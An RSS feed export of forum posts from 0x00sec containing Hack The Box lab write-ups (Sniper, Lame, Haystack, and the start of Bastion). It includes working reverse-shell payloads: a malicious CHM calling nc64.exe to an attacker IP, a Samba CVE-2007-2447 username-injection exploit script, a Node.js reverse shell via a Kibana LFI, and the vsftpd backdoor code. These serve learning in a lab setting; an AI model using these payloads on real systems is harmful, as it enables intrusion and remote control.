<p>It’s obvious that we have to finish Chris’ job and make a malicious CHM file that the Administrator will open at one point.</p>
<p>Using <a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7" rel="nofollow noopener">this</a> GitHub page as reference I started running a few tests locally after installing the HTML Help WorkShop on a Windows 10 box. I’m pretty sure there’s a way to craft CHM files on Linux too but if I remember correctly it involves Wine and when I use Wine nothing works, so I went the Windows way.</p>
<p>This is the base code provided by GitHub:</p>
<pre><code class="lang-auto">&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;
  &lt;PARAM name="Command" value="ShortCut"&gt;
  &lt;PARAM name="Button" value="Bitmap::shortcut"&gt;
  &lt;PARAM name="Item1" value=',cmd.exe,/c copy /Y C:\Windows\system32\rundll32.exe %TEMP%\out.exe &gt; nul &amp;&amp; %TEMP%\out.exe javascript:"\..\mshtml RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8000/test.vbs",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im out.exe",0,true);}'&gt;
  &lt;PARAM name="Item2" value="273,1,1"&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
</code></pre>
<p>Basically the code simulates a button that presses itself triggering the payload contained in Item1, which is far more complicated than it needs to be for this single challenge so I’ll make it simpler.</p>
<p>After obtaining the a.html file contained in the original CHM found on the box by unpacking it with 7zip we can simply change the code to make it look like this:</p>
<pre><code class="lang-auto">&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;Sniper Android App Documentation&lt;/h1&gt;
&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;
  &lt;PARAM name="Command" value="ShortCut"&gt;
  &lt;PARAM name="Button" value="Bitmap::shortcut"&gt;
  &lt;PARAM name="Item1" value=',cmd.exe,/c c:\users\chris\documents\nc64.exe -e cmd.exe 10.10.14.144 6666'&gt;
  &lt;PARAM name="Item2" value="273,1,1"&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
&lt;h2&gt;Table of Contents&lt;/h2&gt;

&lt;p&gt;Pff... This dumb CEO always makes me do all the shitty work. SMH!&lt;/p&gt;
&lt;p&gt;I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>This reuses the nc64 binary dropped in Chris’ folder to start yet another reverse shell. Create a new project in the HTML Help WorkShop with that code and compile it, then drop the output CHM file in C:\Docs and soon enough what I can only presume to be the CEO will open it giving us a shell as the Administrator:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49812
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
sniper\administrator

C:\Windows\system32&gt;
</code></pre>
<p>And that was Sniper.</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-sniper/20112">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-writeup-sniper/20112</link>
          <pubDate>Sat, 28 Mar 2020 18:53:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20112</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-sniper/20112.rss">HackTheBox Writeup: Sniper</source>
        </item>
        <item>
          <title>Through the looking glass: LAME</title>
          <dc:creator><![CDATA[Jarvis]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>Hey everybody, welcome to my first post on 0x00sec and hopefully the first of many in this <em>Through The Looking Glass</em> series.</p>
<h1>The Purpose</h1>
<p>A lot of Writeups are very straightforward, you nmap the server, you find the vulnerable service. You searchsploit ‘vulnerable service and version’, you load the appropriate msf-module and flags are raining across the screen.</p>
<p>I wanted to have a better look at how these exploits work, and how we can find and create exploits just by looking at patches and the like.</p>
<p>For advanced CTF’ers and Pwners this won’t be anything new, it might not be new if you’ve read vulnerability analysis, but I hope it can be a good resource for new people who are interested in how this stuff all comes together. ( And it’s a good way to try and force myself to contribute <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> )</p>
<p>With that out of the way,…</p>
<h1>Enter LAME (vsftpd 2.3.4 backdoor and CVE-2007-2447)</h1>
<p>I wanted to start bigger, and not use vulnerability scanners.<br>
Because of this, I started out with my nmap portscan, and just began my journey on the lowest port.</p>
<pre><code>21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
</code></pre>
<h2>vsftpd 2.3.4 and vsf_sysutil_extra backdoor</h2>
<p>Because the year is 2020 and news spreads fast, when I started my dumb approach of vsftpd, the term backdoor immediately got thrown in my face upon the first Google search.</p>
<p>It turns out that, at some point in time, someone had managed to build a backdoor into vsftpd.</p>
<p>Armed with this knowledge, I found a blog post by the maintainer of vsftpd that contained a link to pastebin, where a diff was shown from after the backdoor was removed (longer code ahead):</p>

Full Patch <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
<p>If you’ve ever programmed sockets in C, You immediately recognize the part where the TCP Server is being set up, if you don’t, <a href="https://www.binarytides.com/socket-programming-c-linux-tutorial/" rel="nofollow noopener">Here</a>’s a good read <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<pre><code>-  sa.sin_family = AF_INET;
-  sa.sin_port = htons(6200);
-  sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd,(struct sockaddr *)&amp;sa,
-  sizeof(struct sockaddr))) &lt; 0) exit(1);
-  if((listen(fd, 100)) == -1) exit(1);
-  for(;;)
-  {
-    rfd = accept(fd, 0, 0);
-    close(0); close(1); close(2);
-    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
-    execl("/bin/sh","sh",(char *)0);
</code></pre>
<p>So a TCP Server is being set up on port 6200 in this function, and then it just accepts any connection and pipe’s everything from and to /bin/sh.</p>
<p>The other part shows us how we can trigger this function:</p>
<pre><code>-    else if((p_str-&gt;p_buf[i]==0x3a)
-    &amp;&amp; (p_str-&gt;p_buf[i+1]==0x29))
-    {
-      vsf_sysutil_extra();
-    }
}
</code></pre>
<p>We have this mysterious buffer called p_buf that’s a member of p_str, and if the i’d and i+1’d character respectively are 0x3a and 0x29, it runs the vsf_sysutil_extra() function, effectively setting up the backdoor on port 6200.</p>
<p>The snake quickly shows us what these bytes are:</p>
<pre><code>&gt;&gt;&gt; s = b'\x3a\x29'
&gt;&gt;&gt; s.encode('utf-8')
':)'
</code></pre>
<p>Because I couldn’t find the original source code for vsftpd 2.3.4 that had this vulnerability, I later found out that one of the things that enters p_str’s p_buf, is the username.</p>
<p>So all we have to do to trigger the backdoor is enter a smileyface for the username, and the backdoor should spawn on 6200.</p>
<pre><code>jarvis@kali:~/Documents/research$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:jarvis): :)
331 Please specify the password.
Password: (eehm wtf?)
530 Login incorrect.
Login failed.
ftp&gt; exit
221 Goodbye.
</code></pre>
<p>So after 2 hours of trying to find the details of this vulnerability, finding an anticlimactic tcp bind backdoor, it turns out it’s anti-anticlimactically patched ! Seems like this box didn’t steal its name <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<h2>Samba 3.0.20</h2>
<p>Because I didn’t have smbv1 enabled, my machine couldn’t properly communicate with the server’s smbd and I had no idea where to start with this approach.<br>
I could just load every samba exploit into metasploit, and I’d probably find one that works, but that wont be interesting and I wont learn from that.</p>
<p>I later ran into <a href="https://github.com/blark/checksmbv1/blob/master/checksmbv1.py" rel="nofollow noopener">this</a> script, that uses the amazing impacket library to test for smbv1.</p>
<p>Lo and behold:</p>
<pre><code>jarvis@ubuntu:~/Tools$ python3 check_smb1.py 10.10.10.3
Attempting SMBv1 connection to 10.10.10.3...
Success!
</code></pre>
<p>Now that we know this, we ran smbclient from our smbv1 enabled machine and quickly found a correct version number: 3.0.20.<br>
I started looking around CVEDetails and found <a href="https://www.cvedetails.com/cve/CVE-2007-2447/" rel="nofollow noopener">this nice little CVE</a>.</p>
<blockquote>
<p>The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the “username map script” smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.</p>
</blockquote>
<p>It’s a very long shot, because it requires a non-default option to be turned on. But it’s a solid exploit and certainly worth a try from this point of view.</p>
<p>We find a patch for 3 vulnerabilities for version 3.0.24:</p>
<p><span alt="image" data-base62-sha1="qGZXEGkwkuxsTVHyQJykGljnWNd" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Which also has our CVE-2007-2447.<br>
A link to the full patch is <a href="https://www.samba.org/samba/ftp/patches/security/samba-3.0.24-CVE-2007-2447_v2.patch" rel="nofollow noopener">here</a> if you want to read it, I’ll only include relevant parts below.</p>
<p>I downloaded the 3.0.24 source code, applied the patch and started a comparison in Meld (I don’t like reading raw patch notes, sue me).</p>
<p>A first indicator of a possible fix was here:</p>
<p><span alt="image" data-base62-sha1="4Cv3baawSQqnLpeaar4pQNsGIor" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>They added an option to the smbrun function to toggle sanitizing.<br>
Does that mean stuff didn’t get sanitized before?</p>
<p>And that’s when we see it in all its glory:</p>
<p><span alt="image" data-base62-sha1="t1AWFXdSXY6GDS1TekiKmd9cPMS" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>What this means, is that if we have ANY saying over what’s in ‘cmd’, we might just have found our RCE.</p>
<p>I quickly grep the source files for uses of this smb function and notice something interesting:</p>

Full Grep <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
<p>There’s this line:</p>
<pre><code>smbd/map_username.c:            ret = smbrun(command, &amp;fd);
</code></pre>
<p>CVEDetails clearly made note of the “username map script” being enabled in the config.<br>
When reading the comments, we notice that’s pretty much gonna be all there’s to it:</p>
<blockquote>
<p>…<br>
This is the main function that should be called <em>once</em> on<br>
any incoming or new username - in order to canonicalize the name.<br>
…</p>
</blockquote>
<p>So, if the script is enabled, on every incoming connection this command will be called?</p>
<p>And then we see how we might get our input into the cmd variable:</p>
<pre><code>pstr_sprintf( command, "%s \"%s\"", cmd, user );
ret = smbrun(command, &amp;fd);
</code></pre>
<p>This basically creates a string ‘some_command “user”’ and passes it to smbrun.<br>
smbrun in turn, just execl’s this without sanitizing.</p>
<h2>The exploit</h2>
<p>We know this function takes a hardcoded or variable ‘map user’ command, and then appends our username to it, this makes its way to execl and gets piped into /bin/sh -c.</p>
<p>When adding backticks, (which are specifically filtered after the patch), you will execute the command inside those backticks before passing it to the outer command.</p>
<p>So what would happen if our username was Jimmy<code>ls</code> ?</p>
<p>Our command string would become map_user_command “Jimmy<code>ls</code>”</p>
<p>So what if our map_user_command hypothetically is echo ?</p>
<pre><code>jarvis@kali:~/Documents/research$ echo "Jimmy`ls`"
Jimmysamba-3.0.24
samba-3.0.24-patched
samba-3.0.24.tar.gz
samba.patch
</code></pre>
<p>I quickly grabbed the SMBv1 checker, and modified it to send a netcat reverse shell payload.</p>
<pre><code>from impacket.smbconnection import SMBConnection, smb
import click
@click.command()
@click.argument('ip')
@click.argument('rev_shell_ip')
@click.argument('rev_shell_port')
def check_smbv1(ip, rev_shell_ip, rev_shell_port):
    click.echo(f'Attempting SMBv1 connection to {ip}', nl=False)
    try:
        s = SMBConnection('*SMBSERVER', ip, preferredDialect=smb.SMB_DIALECT)
        if isinstance(s, SMBConnection):
            click.secho('Success!', fg='green')
            click.secho('Attempting to send PoC exploit payload...', fg='yellow')
            s.login(b'Jimmy`nc 10.10.14.30 4444 -e /bin/bash`', 'fakepass')
    except Exception as e:
        click.secho('Failed...', fg='red', nl=False)
        click.echo(e)
        return
if __name__ == '__main__':
    check_smbv1()
</code></pre>
<p>And the magic came all together:</p>
<p><span alt="image" data-base62-sha1="t1bjTNokvwUQjbClM7i2HhYpAno" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Because SMBd was running as root, this was pretty much all there is to this machine.</p>
<p>I hoped you enjoyed reading, if you have questions or tips let me know, dont forget to &lt;3 the post if you liked it, so I know I can do more of this basic stuff on here!</p>
<p>Ah, I allmost forgot the flags!</p>

Summary <a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149/1">(click for more details)</a>
<p>Thanks all,</p>
<p>Jarvis</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/through-the-looking-glass-lame/19149">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/through-the-looking-glass-lame/19149</link>
          <pubDate>Tue, 11 Feb 2020 18:48:33 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-19149</guid>
          <source url="https://0x00sec.org/t/through-the-looking-glass-lame/19149.rss">Through the looking glass: LAME</source>
        </item>
        <item>
          <title>Hack The Box - Haystack</title>
          <dc:creator><![CDATA[hostile.node]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="/uploads/default/original/2X/2/22087bc90213dba4f6bf2c46d9fe24b3d60906e5.png" alt="" data-base62-sha1="4R4ppBzjzDNt2Kqyggs4I3fqZOl" width="589" height="334"></p>
<p>We start by running nmap, with the following options:</p>
<blockquote>
<p>root@flagship:~# nmap -p- -T4 -oN notes -A 10.10.10.115</p>
</blockquote>
<p>I always run it with -p-, which will scan all 65536 ports, rather than just the 1000 most common. And in this case, we see a few open ports:</p>
<pre><code>PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                      
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.12.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    syn-ack ttl 63 nginx 1.12.2
|_http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
| http-methods:
|   Supported Methods: HEAD GET DELETE OPTIONS
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
</code></pre>
<p>On port 80, it’s just a page with an image of a needle in a haystack.</p>
<p>But since this is HTB, it’s worth having a quick look for any steganography. <code>strings</code> doesn’t reveal anything, but <code>xxd</code> does, at the very end of the file:</p>
<pre><code>0002ca80: 8a00 28a2 8a00 28a2 8a00 28a2 8a00 28a2  ..(...(...(...(.
0002ca90: 8a00 28a2 8a00 ffd9 0a62 4745 6759 5764  ..(......bGEgYWd
0002caa0: 3161 6d45 675a 5734 675a 5777 6763 4746  1amEgZW4gZWwgcGF
0002cab0: 7159 5849 675a 584d 6749 6d4e 7359 585a  qYXIgZXMgImNsYXZ
0002cac0: 6c49 673d 3d0a                           lIg==.
</code></pre>
<p>That looks like base64, so let us decode that:</p>
<blockquote>
<p>root@flagship:~# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d<br>
la aguja en el pajar es “clave”</p>
</blockquote>
<p>Spanish for <em>the needle in the page is “key”</em> or perhaps literally, <em>clave</em> .</p>
<p>Since there doesn’t appear to be anything else to do with the image, let’s have a look at port 9200. If we access it, we get the following:</p>
<pre><code>root@flagship:~/htb/jarvis# curl http://10.10.10.115:9200/
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
</code></pre>
<p>So we’re dealing with an ElasticSearch instance, version 6.4.2. If you aren’t familiar with it, this is a good starting point: <a href="http://joelabrahamsson.com/elasticsearch-101/" rel="noopener nofollow ugc">ElasticSearch 101</a>. However, the relevant part here is that URLs are expected to be in the format of <code>http://10.10.10.115:9200/&lt;index&gt;/&lt;type&gt;/&lt;id&gt;</code> , so we can try to find which indices are available with gobuster:</p>
<pre><code>root@flagship:~# gobuster dir -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.115:9200/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/07 21:21:02 Starting gobuster
===============================================================
/quotes (Status: 200)
/bank (Status: 200)
</code></pre>
<p>Knowing that the indices <code>quotes</code> and <code>bank</code> exist, we then need to find types which have indices. Gobuster won’t cut it for this, as we want to look for <code>http://10.10.10.115:9200/quotes/&lt;type&gt;/1</code> and <code>http://10.10.10.115:9200/bank/&lt;type&gt;/1</code> , so we turn to wfuzz:</p>
<pre><code>root@flagship:~# wfuzz -u http://10.10.10.115:9200/quotes/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.115:9200/quotes/FUZZ/1
Total requests: 220560
==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
000826:  C=200      0 L       63 W          462 Ch        "quote"
</code></pre>
<p>And then we repeat the same for <code>bank</code>:</p>
<pre><code>root@orbital:~# wfuzz -u http://10.10.10.115:9200/bank/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.115:9200/bank/FUZZ/1
Total requests: 220560
==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
000349:  C=200      0 L        3 W          286 Ch        "account"
</code></pre>
<p>Now that we know two types, we just have to identify what valid ids there are. Again, wfuzz can do this by using a range iterator:</p>
<blockquote>
<p>root@orbital:~# wfuzz -u <a href="http://10.10.10.115:9200/bank/account/FUZZ" rel="noopener nofollow ugc">http://10.10.10.115:9200/bank/account/FUZZ</a> -z range,1-2000 --hc 404<br>
root@orbital:~# wfuzz -u <a href="http://10.10.10.115:9200/quotes/quote/FUZZ" rel="noopener nofollow ugc">http://10.10.10.115:9200/quotes/quote/FUZZ</a> -z range,1-2000 --hc 404</p>
</blockquote>
<p>This will show us that there are 999 valid ids – which we can then download using our trusty curl for further analysis.</p>
<blockquote>
<p>root@flagship:~# curl “<a href="http://10.10.10.115:9200/bank/accounts/%5B1-999%5D" rel="noopener nofollow ugc">http://10.10.10.115:9200/bank/accounts/[1-999]</a>” -o “accounts/<span class="hashtag">#1</span>”<br>
root@flagship:~# curl “<a href="http://10.10.10.115:9200/quotes/quote/%5B1-999%5D" rel="noopener nofollow ugc">http://10.10.10.115:9200/quotes/quote/[1-999]</a>” -o “quotes/<span class="hashtag">#1</span>”</p>
</blockquote>
<p>I didn’t find any useful information in the nearly 2000 files when blindly searching for credentials, but using what we’ve got from the image we get the following:</p>
<blockquote>
<p>root@flagship:~# grep -r clave *<br>
quotes/45.html:{"_index":“quotes”,"_type":“quote”,"_id":“45”,"_version":1,“found”:true,"_source":{“quote”:“Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg “}}<br>
quotes/111.html:{”_index”:“quotes”,"_type":“quote”,"_id":“111”,"_version":1,“found”:true,"_source":{“quote”:“Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=”}}</p>
</blockquote>
<p>With some more base64-looking strings, we decode them as before:</p>
<pre><code>root@flagship:~# echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security 
root@flagship:~# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
pass: spanish.is.key
</code></pre>
<p>With these credentials, we can login via SSH and grab the user flag.</p>
<blockquote>
<p>root@flagship:~# ssh <a href="mailto:security@10.10.10.115">security@10.10.10.115</a><br>
<a href="mailto:security@10.10.10.115">security@10.10.10.115</a>’s password:<br>
[security@haystack ~]$ ls<br>
user.txt</p>
</blockquote>
<p>Now that we have a foothold, the next step is to run <a href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh" rel="noopener nofollow ugc">Linux Smart Enumeration</a> and see if that gives us anything interesting to go on. Thankfully, since we already have SSH access, we can just copy it over with scp rather anything more elaborate.</p>
<p>From a cursory look at the results from LSE, we can see this server is running an ELK stack (<a href="https://www.elastic.co/products/elasticsearch" rel="noopener nofollow ugc">ElasticSearch</a>, <a href="https://www.elastic.co/products/logstash" rel="noopener nofollow ugc">Logstash</a>, <a href="https://www.elastic.co/products/kibana" rel="noopener nofollow ugc">Kibana</a>), with matching user accounts. Additionally, Logstash is running as root and is a likely escalation point.</p>
<p>It also looks like the following ports can be accessed internally: 5601 (Kibana), 9000 and 9300 (both ElasticSearch). 5601 is particularly interesting as it wasn’t available remotely.</p>
<p>Since we know we’re running ElasticSearch 6.4.2, it’s worth checking if there are any issues we can leverage. <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-13554/Elasticsearch.html" rel="noopener nofollow ugc">Looking for vulnerabilities</a> the very first one seems relevant: <a href="https://www.cvedetails.com/cve/CVE-2018-17246/" rel="noopener nofollow ugc">CVE-2018-17246</a> (detailed explanation <a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" rel="noopener nofollow ugc">here</a>).</p>
<p>It looks like we might get an LFI using this, which would then let us gain access to the kibana user. We can get a viable node reverse shell from <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell" rel="noopener nofollow ugc">here</a>:</p>
<pre><code>(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.33.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
</code></pre>
<p>We copy this to haystack (in my case, I copied it to /tmp) and call the vulnerable endpoint:</p>
<pre><code>[security@haystack tmp]$ curl 127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../../../tmp/hn1.js  
</code></pre>
<p>An on our attacking machine we get a callback:</p>
<pre><code>root@flagship:~/shared.node/htb# nc -lvp 1337
listening on [any] 1337 ...
10.10.10.115: inverse host lookup failed: Unknown host
connect to [10.10.16.40] from (UNKNOWN) [10.10.10.115] 52436
whoami
kibana
</code></pre>
<p>And then we upgrade our shell into something a bit more usable:</p>
<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'  
bash-4.2$
</code></pre>
<p>We know that logstash runs as root, so that is probably our way in. The normal flow for a simple ELK stack is that data from ElasticSearch gets processed by LogStash and then presented by Kibana, and we can find that step in <code>/etc/logstash/conf.d</code>. The folder is only accessible now that we are logged in as the kibana user. However, although the files can be read, they can’t be modified.</p>
<h2>input.conf</h2>
<pre><code>input {
         file {
                 path =&gt; "/opt/kibana/logstash_*"
                 start_position =&gt; "beginning"
                 sincedb_path =&gt; "/dev/null"
                 stat_interval =&gt; "10 second"
                 type =&gt; "execute"
                 mode =&gt; "read"
         }
 }
</code></pre>
<h2>filter.conf</h2>
<pre><code>filter {
        if [type] == "execute" {
                grok {
                        match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
</code></pre>
<h2>output.conf</h2>
<pre><code>output {
        if [type] == "execute" {
                stdout { codec =&gt; json }
                exec {
                        command =&gt; "%{comando} &amp;"
                }
        }
}
</code></pre>
<p>From reading these files, we can see that it takes input files in the folder /opt/kibana/, with the filename having to start with logstash_. The contents of the file have to be Ejecutar comando : followed by the command we want to execute.</p>
<p>Since we know what we want to get out is the root flag, we can do the following:</p>
<pre><code>bash-4.2$ echo Ejecutar comando : cp /root/root.txt /tmp/root.txt &gt; /tmp/logstash_root
bash-4.2$ echo Ejecutar comando : chmod 777 /tmp/root.txt &gt; logstash_root2
</code></pre>
<p>And within ten seconds our commands will get executed:</p>
<pre><code>bash-4.2$ wc -c /tmp/root.txt&lt;br&gt;
wc -c /tmp/root.txt&lt;br&gt;
33 /tmp/root.txt
</code></pre>
<p>Hopefully this was useful to someone <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/hack-the-box-haystack/17303">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hack-the-box-haystack/17303</link>
          <pubDate>Mon, 04 Nov 2019 15:20:12 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-17303</guid>
          <source url="https://0x00sec.org/t/hack-the-box-haystack/17303.rss">Hack The Box - Haystack</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Bastion</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/91e243f52a10caca8a8034474494704d10e55ce4.png" alt="image" data-base62-sha1="kOy0iavcX1uiWr2ACFLzX2rPydu" width="598" height="381"></p>
<p>Bastion proved to be a very easy yet pretty fun challenge, quite unique in its kind even if it doesn’t present any particular difficulties, all one needs to complete this box is a search engine to learn how to accomplish certain tasks, all of which only take a couple minutes to solve, hence why so many people finished this box despite it not being one of those two clicks to root kind of boxes (I’m looking at you, Blue, Jerry, Lame, etc…). The first half of the challenge involves finding a Windows backup containing an old copy of the SAM database, which when read gives us SSH credentials to log in the box. Once inside the administrator’s password must be extracted and decrypted from the saved settings of a remote sessions manager.</p>
<hr>
<h2>Drawing the perimeter</h2>
<p>I begin by scanning the box with a standard service scan (-sV) and executing the default list of NSE scripts (-sC), and one of the first things one can notice is that nmap found guest login available on SMB:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2ae560eb4fcdd041708ab50d46a6d58352111f77.png" alt="image" data-base62-sha1="67tuHfAKCdo76i3tCXvOqX2Slzp" width="537" height="500"></p>
<p>We can use this access to list the available shares:</p>
<pre><code class="lang-auto">$ smbclient -L 10.10.10.134
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/595fdf0c1b7e8b95b4a006e18c0115938d27391e.png" alt="image" data-base62-sha1="cKDTGr9zxU3pKXSQJNRmu9146js" width="655" height="226"></p>
<p>Backups seems to be the only unprotected share on the system so let’s access it and see what’s inside:</p>
<pre><code class="lang-auto">$ smbclient \\\\10.10.10.134\\Backups
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/317bcb02068ce4254de5ad4e97b152a3d376c344.png" alt="image" data-base62-sha1="73KCwotc8ALYtcSBy0Pn92Pdnrm" width="631" height="500"></p>
<p>This whole share contains a Windows backup, in fact if we go further in the directory tree we reach two <em>.vhd</em> (Virtual Hard Drive) files, which contain the whole backed up disk:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b37732c3478a82c816e17b9d4bc3eb467e5d4433.png" alt="image" data-base62-sha1="pBCQB9cslcrkENGTcASBIasTqev" width="628" height="90"></p>
<p>One of these files is very big though so downloading it isn’t very convenient, also we found a <em>note.txt</em> file on the root of the share which gives us a very clear hint on what we shouldn’t be doing:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/99235f90755626e3f56909a8105eec5c3bad3320.png" alt="image" data-base62-sha1="lQIQ4Euz6A1r3D1EjYsZYmPlK4E" width="651" height="81"></p>
